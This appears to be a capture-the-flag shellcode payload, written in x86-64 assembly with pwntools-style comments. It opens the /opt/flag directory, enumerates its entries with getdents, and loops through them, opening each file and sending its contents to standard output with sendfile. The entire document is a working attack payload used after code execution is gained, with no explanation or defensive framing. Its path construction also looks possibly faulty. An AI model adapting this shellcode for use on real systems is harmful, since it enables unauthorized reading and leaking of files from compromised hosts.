 /* open(file='/opt/flag', oflag=0, mode=0) */
    /* push b'/opt/flag\x00' */
    mov r10w, 0x2f67;
    push r10w;
    mov r15, 0x616c662f74706f2f
    push r15
    mov rdi, rsp
    xor esi, esi /* 0 */
    /* call open() */
    mov al,0x2
    syscall

    sub rsp, 0x6000;
    /* call getdents('rax', 'rsp', 0x8000) */
    mov rdi, rax
    push SYS_getdents /* 0x4e */
    pop rax
    xor edx, edx
    mov dh, 0x8000 >> 8
    mov rsi, rsp
    syscall

    xor r13,r13;

    loop:
    add rsp,r13;
    mov r12, rsp;

    mov r13b, [rsp+0x10];

    add rsp,0x12;
    push r10w;
    push r15;
    /* open(file='rsp', oflag=0, mode=0) */
    mov rdi, rsp
    xor edx, edx /* 0 */
    xor esi, esi /* 0 */
    /* call open() */
    push SYS_open /* 2 */
    pop rax
    syscall
    /* call sendfile('1', 'rax', 0, 0xc9) */
    mov rsi, rax
    push SYS_sendfile /* 0x28 */
    pop rax
    push (1) /* 1 */
    pop rdi
    syscall

    mov rsp, r12;

    jmp loop